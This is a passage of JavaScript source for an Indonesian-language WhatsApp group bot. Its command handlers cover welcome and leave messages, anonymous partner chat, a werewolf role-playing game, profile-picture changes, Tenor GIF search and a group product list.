changeSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
}
break
case 'delsetwelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return reply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
reply(`Sukses delete set welcome`)
break
case 'setleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return reply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully set left!`)
break
case 'changeleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
}
break
case 'delsetleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return reply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
reply(`Sukses delete set left`)
break
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await Tan.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await Tan.sendContact(partnerJID, [m.sender.split("@")[0]])
Tan.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: fcall })
Tan.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
  await loading()
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Tan.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await Tan.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Tan.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
//=========================================\\======
case 'yo': {
  if (!text) return replyTan(`Example : ${command} siapakah elon musk`)
  replyTan(`Sedang Proses Permintaan...`)
const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=kamu adalah Shizuka ini `)
    const msgai = data1.result;
replyTan(`${msgai}`)
}
break
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    Tan.werewolf = Tan.werewolf ? Tan.werewolf : {};
    const ww = Tan.werewolf ? Tan.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        Tan.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(Tan, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(Tan, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(Tan, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${Tan.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await Tan.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await Tan.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${Tan.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await Tan.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${Tan.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await Tan.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await Tan.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${Tan.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await Tan.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await Tan.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${Tan.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await Tan.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await Tan.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await Tan.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(Tan, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        Tan.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        Tan.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    Tan.werewolf = Tan.werewolf ? Tan.werewolf : {};
    const ww = Tan.werewolf ? Tan.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati");
    if (!target || target.length < 1) return reply("Masukan nomor player");
    if (isNaN(target)) return reply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player sudah mati");
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return reply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return reply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("Peran ini bukan untuk kamu");
        return reply(`Berhasil melindungi player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//==================================================================
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Tan.downloadAndSaveMediaMessage(quoted)
			let botNumber = await Tan.decodeJid(Tan.user.id)
			let { img } = await pepe(media)
			await Tan.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Tan.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await Tan.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return reply("*Example:*\n.tenor [tema]|[angka]")
    if (!urutan) return reply("*Example:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return reply("*Example:*\n.tenor [tema]|[angka]")
    await replyTan(`Sedang Proses Permintaan...`)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return reply("Input query!\n*Example:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await Tan.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await reply(eror)
    }
}
break

//===============Store-Menu================\\
case 'list': case 'store':{
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
Tan.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, { quoted: fcall }) 
}
break
case 'dellist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'addlist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await Tan.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
